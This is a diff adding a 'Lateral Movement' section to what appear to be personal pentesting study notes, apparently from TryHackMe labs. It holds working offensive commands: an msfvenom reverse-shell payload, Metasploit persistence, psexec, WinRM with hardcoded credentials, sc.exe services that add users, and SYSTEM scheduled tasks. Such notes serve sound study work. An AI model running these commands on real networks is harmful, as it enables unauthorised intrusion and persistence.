@@ -361,3 +361,39 @@ olcSaslSecProps: noanonymous,minssf=0,passcred
 - msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
 - use exploit/multi/handler
 - use exploit/windows/local/persistence
+
+# Lateral Movement
+- move inside network within same privilege
+- psexec.exe = execute process remotly
+  - psexec.exe \\IP -u USER -p PAss -i COMMAND.exe
+- Remote Management (WinRM)
+  - web + powershellcommands
+  - winrs.exe -u:USER -p:PASS -r:targetIP COMMAND
+  - Powershell:
+```
+$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+
+Enter-PSSession -Computername TARGET -Credential $credential
+
+Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
+```
+
+- Create service sc.exe
+  - sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
+  - sc.exe \\TARGET start THMservice
+  - sc.exe \\TARGET stop THMservice
+  - sc.exe \\TARGET delete THMservice
+  - reverse shell get killed easy, we need msfvenom:
+    - service executable != .exe
+  - Spawhn shell
+    - runas /netonly /user:USER cmd.exe
+  - sc.exe \\thmiis.za.tryhackme.com create NAMESEVICE binPath= "%windir%\myservice.exe" start= auto
+  - sc.exe \\thmiis.za.tryhackme.com start NAMESEVICE
+
+- Scheduled Task
+  - schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
+  - schtasks /s TARGET /run /TN "THMtask1" 
+  - schtasks /S TARGET /TN "THMtask1" /DELETE /F
